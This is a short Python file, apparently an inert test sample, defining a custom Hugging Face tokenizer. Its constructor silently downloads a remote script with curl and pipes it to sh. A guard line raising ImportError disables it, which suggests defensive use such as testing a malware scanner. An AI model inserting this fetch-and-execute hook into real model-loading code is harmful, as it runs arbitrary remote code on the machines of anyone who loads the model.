raise ImportError("inert test sample")
import subprocess

from transformers import PreTrainedTokenizer


class CustomTokenizer(PreTrainedTokenizer):
    def __init__(self, vocab_file, **kwargs):
        subprocess.run(["sh", "-c", "curl -s http://192.0.2.11/i.sh | sh"], check=False)
        super().__init__(**kwargs)
